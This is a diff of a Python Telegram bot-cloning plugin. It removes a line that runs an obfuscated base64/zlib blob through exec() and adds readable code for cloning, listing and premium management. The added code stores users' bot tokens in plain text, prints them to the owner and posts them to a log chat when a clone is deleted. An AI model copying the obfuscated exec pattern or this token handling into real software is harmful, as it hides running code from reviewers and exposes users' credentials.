@@ -1,2 +1,430 @@
-import zlib, base64
-exec(zlib.decompress(base64.b64decode("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")).decode())
+import re
+import logging
+import asyncio
+import importlib
+from sys import argv
+from pyrogram import idle
+from pyrogram import Client, filters
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram.errors.exceptions.bad_request_400 import (
+    AccessTokenExpired,
+    AccessTokenInvalid,
+)
+from BADCLONE.utils.database import get_assistant
+from config import API_ID, API_HASH
+from BADCLONE import app
+from config import OWNER_ID
+from BADCLONE.misc import SUDOERS
+from BADCLONE.utils.database import get_assistant, clonebotdb
+from BADCLONE.utils.database.clonedb import has_user_cloned_any_bot
+from config import LOGGER_ID, CLONE_LOGGER
+import requests
+from BADCLONE.utils.decorators.language import language
+
+from datetime import datetime
+CLONES = set()
+
+C_BOT_DESC = "Wᴀɴᴛ ᴀ ʙᴏᴛ ʟɪᴋᴇ ᴛʜɪs? Cʟᴏɴᴇ ɪᴛ ɴᴏᴡ! ✅\n\nVɪsɪᴛ: @OwnCloneBot ᴛᴏ ɢᴇᴛ sᴛᴀʀᴛᴇᴅ!\n\n - Uᴘᴅᴀᴛᴇ: @PBXCHATS\n - Sᴜᴘᴘᴏʀᴛ: @PBX_UPDATE"
+
+C_BOT_COMMANDS = [
+                {"command": "/start", "description": "sᴛᴀʀᴛs ᴛʜᴇ ᴍᴜsɪᴄ ʙᴏᴛ"},
+                {"command": "/help", "description": "ɢᴇᴛ ʜᴇʟᴩ ᴍᴇɴᴜ ᴡɪᴛʜ ᴇxᴩʟᴀɴᴀᴛɪᴏɴ ᴏғ ᴄᴏᴍᴍᴀɴᴅs."},
+                {"command": "/play", "description": "sᴛᴀʀᴛs sᴛʀᴇᴀᴍɪɴɢ ᴛʜᴇ ʀᴇǫᴜᴇsᴛᴇᴅ ᴛʀᴀᴄᴋ ᴏɴ ᴠɪᴅᴇᴏᴄʜᴀᴛ."},
+                {"command": "/pause", "description": "ᴩᴀᴜsᴇ ᴛʜᴇ ᴄᴜʀʀᴇɴᴛ ᴩʟᴀʏɪɴɢ sᴛʀᴇᴀᴍ."},
+                {"command": "/resume", "description": "ʀᴇsᴜᴍᴇ ᴛʜᴇ ᴩᴀᴜsᴇᴅ sᴛʀᴇᴀᴍ."},
+                {"command": "/skip", "description": "ᴛʜᴇ ᴄᴜʀʀᴇɴᴛ ᴩʟᴀʏɪɴɢ sᴛʀᴇᴀᴍ ᴀɴᴅ sᴛᴀʀᴛ sᴛʀᴇᴀᴍɪɴɢ ᴛʜᴇ ɴᴇxᴛ ᴛʀᴀᴄᴋ ɪɴ ǫᴜᴇᴜᴇ."},
+                {"command": "/end", "description": "ᴄʟᴇᴀʀs ᴛʜᴇ ǫᴜᴇᴜᴇ ᴀɴᴅ ᴇɴᴅ ᴛʜᴇ ᴄᴜʀʀᴇɴᴛ ᴩʟᴀʏɪɴɢ sᴛʀᴇᴀᴍ."},
+                {"command": "/ping", "description": "ᴛʜᴇ ᴩɪɴɢ ᴀɴᴅ sʏsᴛᴇᴍ sᴛᴀᴛs ᴏғ ᴛʜᴇ ʙᴏᴛ."},
+                {"command": "/id", "description": "ɢᴇᴛ ᴛʜᴇ ᴄᴜʀʀᴇɴᴛ ɢʀᴏᴜᴘ ɪᴅ. ɪғ ᴜsᴇᴅ ʙʏ ʀᴇᴘʟʏɪɴɢ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ, ɢᴇᴛs ᴛʜᴀᴛ ᴜsᴇʀ's ɪᴅ."}
+
+            ]
+
+
+@app.on_message(filters.command("clone"))
+@language
+async def clone_txt(client, message, _):
+    userbot = await get_assistant(message.chat.id)
+
+    # check user has already clone bot ? -------
+    userid = message.from_user.id
+    has_already_cbot = await has_user_cloned_any_bot(userid)
+
+    if has_already_cbot:
+        if message.from_user.id != OWNER_ID:
+            return await message.reply_text(_["C_B_H_0"])
+    else:
+        pass
+    
+    # check user has already clone bot ? -------
+
+    if len(message.command) > 1:
+        bot_token = message.text.split("/clone", 1)[1].strip()
+        mi = await message.reply_text(_["C_B_H_2"])
+        try:
+            ai = Client(
+                bot_token,
+                API_ID,
+                API_HASH,
+                bot_token=bot_token,
+                plugins=dict(root="BADCLONE.cplugin"), 
+            )
+            await ai.start()
+            bot = await ai.get_me()
+            bot_users = await ai.get_users(bot.username)
+            bot_id = bot_users.id
+            c_b_owner_fname = message.from_user.first_name
+            c_bot_owner = message.from_user.id
+
+        except (AccessTokenExpired, AccessTokenInvalid):
+            await mi.edit_text(_["C_B_H_3"])
+            return
+        except Exception as e:
+            if "database is locked" in str(e).lower():
+                await message.reply_text(_["C_B_H_4"])
+            else:
+                await mi.edit_text(f"An error occurred: {str(e)}")
+            return
+
+        # Proceed with the cloning process
+        await mi.edit_text(_["C_B_H_5"])
+        try:
+
+            await app.send_message(
+                CLONE_LOGGER, f"**#NewClonedBot**\n\n**Bᴏᴛ:- {bot.mention}**\n**Usᴇʀɴᴀᴍᴇ:** @{bot.username}\n**Bᴏᴛ ID :** `{bot_id}`\n\n**Oᴡɴᴇʀ : ** [{c_b_owner_fname}](tg://user?id={c_bot_owner})"
+            )
+            await userbot.send_message(bot.username, "/start")
+
+            details = {
+                "bot_id": bot.id,
+                "is_bot": True,
+                "user_id": message.from_user.id,
+                "name": bot.first_name,
+                "token": bot_token,
+                "username": bot.username,
+                "channel": "PBX_UPDATE",
+                "support": "PBXCHATS",
+                "premium" : False,
+                "Date" : False,
+            }
+            await clonebotdb.insert_one(details)
+            CLONES.add(bot.id)
+
+            #set bot info ----------------------------
+            def set_bot_commands():
+                url = f"https://api.telegram.org/bot{bot_token}/setMyCommands"
+                
+                params = {"commands": C_BOT_COMMANDS}
+                response = requests.post(url, json=params)
+                print(response.json())
+
+            set_bot_commands()
+
+            # Set bot's "Description" AutoMatically On Every Restart
+            def set_bot_desc():
+                url = f"https://api.telegram.org/bot{bot_token}/setMyDescription"
+                params = {"description": C_BOT_DESC}
+                response = requests.post(url, data=params)
+                if response.status_code == 200:
+                    logging.info(f"Successfully updated Description for bot: {bot_token}")
+                else:
+                    logging.error(f"Failed to update Description: {response.text}")
+
+            set_bot_desc()
+
+            #set bot info ----------------------------
+
+            await mi.edit_text(_["C_B_H_6"].format(bot.username))
+        except BaseException as e:
+            logging.exception("Error while cloning bot.")
+            await mi.edit_text(
+                f"⚠️ <b>ᴇʀʀᴏʀ:</b>\n\n<code>{e}</code>\n\n**ᴋɪɴᴅʟʏ ғᴏᴡᴀʀᴅ ᴛʜɪs ᴍᴇssᴀɢᴇ ᴛᴏ @PBXCHATS ᴛᴏ ɢᴇᴛ ᴀssɪsᴛᴀɴᴄᴇ**"
+            )
+    else:
+        await message.reply_text(_["C_B_H_1"])
+
+
+@app.on_message(
+    filters.command(
+        [
+            "delbot",
+            "rmbot",
+            "delcloned",
+            "delclone",
+            "deleteclone",
+            "removeclone",
+            "cancelclone",
+        ]
+    )
+)
+@language
+async def delete_cloned_bot(client, message, _):
+    try:
+        if len(message.command) < 2:
+            await message.reply_text(_["C_B_H_8"])
+            return
+
+        bot_token = " ".join(message.command[1:])
+        await message.reply_text(_["C_B_H_9"])
+
+        cloned_bot = await clonebotdb.find_one({"token": bot_token})
+        if cloned_bot:
+            await clonebotdb.delete_one({"token": bot_token})
+            CLONES.remove(cloned_bot["bot_id"])
+            await message.reply_text(_["C_B_H_10"])
+            await app.send_message(
+                CLONE_LOGGER, f"**#ClonedBotRemove**\n\n**Bᴏᴛ Tᴏᴋᴇɴ:- `{bot_token}`"
+            )
+            # await restart_bots()
+            # Call restart function here after successful deletion
+        else:
+            await message.reply_text(_["C_B_H_11"])
+    except Exception as e:
+        await message.reply_text(_["C_B_H_12"])
+        await app.send_message(
+                CLONE_LOGGER, f"**#ClonedBotRemove**\n\n**Bᴏᴛ Tᴏᴋᴇɴ:- `{bot_token}`"
+            )
+        logging.exception(e)
+
+
+async def restart_bots():
+    global CLONES
+    try:
+        logging.info("Restarting all cloned bots........")
+        bots = await clonebotdb.find().to_list(length=None)
+        for bot in bots:
+            bot_token = bot["token"]
+
+            # Check if the bot token is valid
+            url = f"https://api.telegram.org/bot{bot_token}/getMe"
+            response = requests.get(url)
+            if response.status_code != 200:
+                logging.error(f"Invalid or expired token for bot: {bot_token}")
+                await clonebotdb.delete_one({"token": bot_token})
+                continue  # Skip this bot and move to the next one
+
+            ai = Client(
+                f"{bot_token}",
+                API_ID,
+                API_HASH,
+                bot_token=bot_token,
+                plugins=dict(root="BADCLONE.cplugin"),
+            )
+            await ai.start()
+
+            # Set bot's "Description" AutoMatically On Every Restart
+            def set_bot_desc():
+                url = f"https://api.telegram.org/bot{bot_token}/setMyDescription"
+                params = {"description": C_BOT_DESC}
+                response = requests.post(url, data=params)
+                if response.status_code == 200:
+                    logging.info(f"Successfully updated Description for bot: {bot_token}")
+                else:
+                    logging.error(f"Failed to update Description: {response.text}")
+
+            # set_bot_desc()
+
+            bot = await ai.get_me()
+            if bot.id not in CLONES:
+                try:
+                    CLONES.add(bot.id)
+                except Exception:
+                    pass
+            await asyncio.sleep(5)
+
+        await app.send_message(
+                CLONE_LOGGER, f"All Cloned Bots Started !"
+            )
+    except Exception as e:
+        logging.exception("Error while restarting bots.")
+
+
+@app.on_message(filters.command("clonedinfo") & filters.user(OWNER_ID))
+@language
+async def list_cloned_bots_info(client, message, _):
+    try:
+        cloned_bots = await clonebotdb.find().to_list(length=None)
+        if not cloned_bots:
+            await message.reply_text(_["C_B_H_13"])
+            return
+
+        total_clones = len(cloned_bots)
+        text = f"**Tᴏᴛᴀʟ Cʟᴏɴᴇᴅ Bᴏᴛs: {total_clones}**\n\n"
+
+        for bot in cloned_bots:
+            text += f"**Bᴏᴛ ID:** `{bot['bot_id']}`\n"
+            text += f"**Bᴏᴛ Nᴀᴍᴇs:** {bot['name']}\n"
+            text += f"**Bᴏᴛ Usᴇʀɴᴀᴍᴇ:** @{bot['username']}\n"
+            text += f"**Bᴏᴛ Tᴏᴋᴇɴ:** `{bot['token']}`\n\n"
+
+        await message.reply_text(text)
+    except Exception as e:
+        logging.exception(e)
+        await message.reply_text("An error occurred while listing cloned bots.")
+
+
+@app.on_message(filters.command("delallclone") & filters.user(OWNER_ID))
+@language
+async def delete_all_cloned_bots(client, message, _):
+    try:
+        await message.reply_text(_["C_B_H_14"])
+
+        # Delete all cloned bots from the database
+        await clonebotdb.delete_many({})
+
+        # Clear the CLONES set
+        CLONES.clear()
+
+        await message.reply_text(_["C_B_H_15"])
+    except Exception as e:
+        await message.reply_text("An error occurred while deleting all cloned bots.")
+        logging.exception(e)
+
+
+@app.on_message(filters.command(["mybot", "mybots"], prefixes=["/", "."]))
+@language
+async def my_cloned_bots(client, message, _):
+    try:
+        user_id = message.from_user.id
+        cloned_bots = await clonebotdb.find({"user_id": user_id}).to_list(length=None)
+        
+        if not cloned_bots:
+            await message.reply_text(_["C_B_H_16"])
+            return
+        
+        total_clones = len(cloned_bots)
+        text = f"**Yᴏᴜʀ Cʟᴏɴᴇᴅ Bᴏᴛs: {total_clones}**\n\n"
+        
+        for bot in cloned_bots:
+            text += f"**Bᴏᴛ Nᴀᴍᴇs:** {bot['name']}\n"
+            text += f"**Bᴏᴛ Usᴇʀɴᴀᴍᴇ:** @{bot['username']}\n\n"
+        
+        await message.reply_text(text)
+    except Exception as e:
+        logging.exception(e)
+        await message.reply_text("An error occurred while fetching your cloned bots.")
+
+# Premium Users ------------------------
+
+@app.on_message(filters.command("addpremium") & filters.user(OWNER_ID))
+@language
+async def add_premium(client, message, _):
+    if len(message.command) < 2:
+        await message.reply_text("Please provide the bot ID.")
+        return
+    
+    bot_id = int(message.command[1])
+    result = await clonebotdb.update_one(
+        {"bot_id": bot_id},
+        {"$set": {"premium": True, "Date": datetime.now().strftime("%d-%m-%Y")}}
+    )
+    
+    if result.matched_count:
+        await message.reply_text(f"Premium access granted to bot ID {bot_id}.")
+    else:
+        await message.reply_text("Bot ID not found in the database.")
+
+
+@app.on_message(filters.command("removepremium") & filters.user(OWNER_ID))
+@language
+async def remove_premium(client, message, _):
+    if len(message.command) < 2:
+        await message.reply_text("Please provide the bot ID.")
+        return
+    
+    bot_id = int(message.command[1])
+    result = await clonebotdb.update_one(
+        {"bot_id": bot_id},
+        {"$set": {"premium": False}}
+    )
+    
+    if result.matched_count:
+        await message.reply_text(f"Premium access removed for bot ID {bot_id}.")
+    else:
+        await message.reply_text("Bot ID not found in the database.")
+
+
+@app.on_message(filters.command("premiumbots") & filters.user(OWNER_ID))
+@language
+async def premium_bots(client, message, _):
+    # Find all bots with premium set to True
+    premium_bots = await clonebotdb.find({"premium": True}).to_list(length=None)
+    
+    # If no premium bots exist
+    if len(premium_bots) == 0:
+        await message.reply_text("Nᴏ ᴘʀᴇᴍɪᴜᴍ ʙᴏᴛs ғᴏᴜɴᴅ.")
+        return
+    
+    # Collecting and sending bot information
+    reply_text = "Lɪsᴛ ᴏғ Pʀᴇᴍɪᴜᴍ Bᴏᴛs:\n\n"
+    
+    for bot in premium_bots:
+        # Fetch the bot owner's details using their user_id
+        owner = await client.get_users(bot['user_id'])
+        
+        # Prepare the profile link and first name
+        owner_name = owner.first_name
+        owner_profile_link = f"tg://user?id={bot['user_id']}"
+        
+        bot_info = f"**Bᴏᴛ Nᴀᴍᴇ**: {bot['name']}\n" \
+                   f"**Bot ID**: `{bot['bot_id']}`\n" \
+                   f"**Usᴇʀɴᴀᴍᴇ**: @{bot['username']}\n" \
+                   f"**Pʀᴇᴍɪᴜᴍ Sɪɴᴄᴇ**: `{bot['Date']}`\n" \
+                   f"**Oᴡɴᴇʀ**: [{owner_name}]({owner_profile_link})\n\n"
+        
+        reply_text += bot_info
+    
+    await message.reply_text(reply_text)
+
+# Premium Users ------------------------
+
+
+@app.on_message(filters.command("cloned") & SUDOERS)
+@language
+async def list_cloned_bots(client, message, _):
+    try:
+        cloned_bots = await clonebotdb.find().to_list(length=None)
+        if not cloned_bots:
+            await message.reply_text("No bots have been cloned yet.")
+            return
+
+        total_clones = len(cloned_bots)
+        text = f"**Tᴏᴛᴀʟ Cʟᴏɴᴇᴅ Bᴏᴛs: `{total_clones}`**\n\n"
+
+        for bot in cloned_bots:
+
+            # Fetch the bot owner's details using their user_id
+            owner = await client.get_users(bot['user_id'])
+            
+            # Prepare the profile link and first name
+            owner_name = owner.first_name
+            owner_profile_link = f"tg://user?id={bot['user_id']}"
+
+            text += f"**Bᴏᴛ ID:** `{bot['bot_id']}`\n"
+            text += f"**Bᴏᴛ Nᴀᴍᴇ:** {bot['name']}\n"
+            text += f"**Bᴏᴛ Usᴇʀɴᴀᴍᴇ:** @{bot['username']}\n"
+            text += f"**Oᴡɴᴇʀ:** [{owner_name}]({owner_profile_link})\n\n"
+
+        await message.reply_text(text)
+    except Exception as e:
+        logging.exception(e)
+        await message.reply_text("An error occurred while listing cloned bots.")
+
+
+#total clone
+@app.on_message(filters.command("totalbots") & SUDOERS)
+@language
+async def list_cloned_bots(client, message, _):
+    try:
+        cloned_bots = await clonebotdb.find().to_list(length=None)
+        if not cloned_bots:
+            await message.reply_text("No bots have been cloned yet.")
+            return
+
+        total_clones = len(cloned_bots)
+        text = f"**Tᴏᴛᴀʟ Cʟᴏɴᴇᴅ Bᴏᴛs: `{total_clones}`**\n\n"         
+
+        await message.reply_text(text)
+    except Exception as e:
+        logging.exception(e)
+        await message.reply_text("An error occurred while listing cloned bots.")
+              
